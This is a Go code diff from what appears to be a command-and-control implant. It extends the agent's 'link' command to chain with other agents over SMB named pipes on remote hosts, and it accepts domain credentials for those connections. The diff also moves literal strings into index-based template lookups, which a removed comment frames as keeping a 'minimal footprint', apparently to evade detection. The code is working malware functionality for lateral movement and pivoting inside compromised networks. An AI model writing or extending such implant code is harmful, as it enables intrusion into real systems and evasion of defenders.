@@ -34,12 +34,9 @@ const (
 	idxLinkPingMarker   = 128
 	idxLinkQuitMarker   = 129
 	idxLinkDot          = 132
-)
-
-// Single-char byte arrays (innocuous, minimal footprint)
-var (
-	lnkColon = string([]byte{0x3a}) // :
-	lnkPipe  = string([]byte{0x7c}) // |
+	idxLinkColon        = 347
+	idxLinkPipe         = 348
+	idxLinkBackslash    = 349
 )
 
 // LinkCommand handles the 'link' command for connecting to other TCP agents
@@ -100,6 +97,55 @@ func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 	targetHost := args[1]
 
 	switch protocol {
+	case c.getTpl(idxLinkProtoSmb):
+		if len(args) < 3 {
+			return CommandResult{
+				Output:      Err(E1),
+				ExitCode:    1,
+				CompletedAt: time.Now().Format(time.RFC3339),
+			}
+		}
+		pipeName := args[2]
+
+		// Parse optional credentials: args[3] = DOMAIN\user, args[4] = password
+		var creds *SMBCredentials
+		if len(args) >= 5 {
+			userStr := args[3]
+			password := args[4]
+
+			// Parse DOMAIN\user format
+			var domain, user string
+			if strings.Contains(userStr, c.getTpl(idxLinkBackslash)) {
+				parts := strings.SplitN(userStr, c.getTpl(idxLinkBackslash), 2)
+				domain = parts[0]
+				user = parts[1]
+			} else {
+				// No domain specified, use "." for local
+				user = userStr
+				domain = c.getTpl(idxLinkDot)
+			}
+
+			creds = &SMBCredentials{
+				Domain:   domain,
+				User:     user,
+				Password: password,
+			}
+		}
+
+		// Handle localhost specially - use "." for local machine
+		localhost := c.getTpl(idxLinkLocalhost)
+		loopback := c.getTpl(idxLinkLoopback)
+		dot := c.getTpl(idxLinkDot)
+		if strings.ToLower(targetHost) == localhost || targetHost == loopback {
+			targetHost = dot
+		}
+
+		// Build the full UNC pipe path
+		uncSlashes := c.getTpl(idxLinkUncSlashes)
+		pipePath := c.getTpl(idxLinkPipePath)
+		fullPipePath := uncSlashes + targetHost + pipePath + pipeName
+		return c.linkSMB(fullPipePath, creds)
+
 	case c.getTpl(idxLinkProtoTcp):
 		port := c.getTpl(idxLinkDefaultPort)
 		if len(args) >= 3 {
@@ -107,7 +153,7 @@ func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 		}
 
 		// Build the TCP address
-		address := targetHost + lnkColon + port
+		address := targetHost + c.getTpl(idxLinkColon) + port
 		return c.linkTCP(address)
 
 	default:
@@ -119,15 +165,15 @@ func (c *LinkCommand) Execute(ctx *CommandContext, args []string) CommandResult 
 	}
 }
 
-func (c *LinkCommand) linkTCP(address string) CommandResult {
+func (c *LinkCommand) linkSMB(pipePath string, creds *SMBCredentials) CommandResult {
 	// Get the link manager
 	lm := GetLinkManager()
 
-	// Attempt to link
-	routingID, err := lm.Link(address)
+	// Attempt to link with credentials (creds can be nil for anonymous)
+	routingID, err := lm.LinkSMB(pipePath, creds)
 	if err != nil {
 		return CommandResult{
-			Output:      ErrCtx(E33, address) + lnkPipe + err.Error(),
+			Output:      ErrCtx(E33, pipePath) + c.getTpl(idxLinkPipe) + err.Error(),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -138,7 +184,32 @@ func (c *LinkCommand) linkTCP(address string) CommandResult {
 
 	statusPrefix := c.getTpl(idxLinkStatusPrefix)
 	return CommandResult{
-		Output:      statusPrefix + address + lnkPipe + routingID + lnkPipe + handshakeResult,
+		Output:      statusPrefix + pipePath + c.getTpl(idxLinkPipe) + routingID + c.getTpl(idxLinkPipe) + handshakeResult,
+		ExitCode:    0,
+		CompletedAt: time.Now().Format(time.RFC3339),
+	}
+}
+
+func (c *LinkCommand) linkTCP(address string) CommandResult {
+	// Get the link manager
+	lm := GetLinkManager()
+
+	// Attempt to link
+	routingID, err := lm.LinkTCP(address)
+	if err != nil {
+		return CommandResult{
+			Output:      ErrCtx(E33, address) + c.getTpl(idxLinkPipe) + err.Error(),
+			ExitCode:    1,
+			CompletedAt: time.Now().Format(time.RFC3339),
+		}
+	}
+
+	// Perform immediate handshake round-trip
+	handshakeResult := c.performImmediateHandshake(lm, routingID)
+
+	statusPrefix := c.getTpl(idxLinkStatusPrefix)
+	return CommandResult{
+		Output:      statusPrefix + address + c.getTpl(idxLinkPipe) + routingID + c.getTpl(idxLinkPipe) + handshakeResult,
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
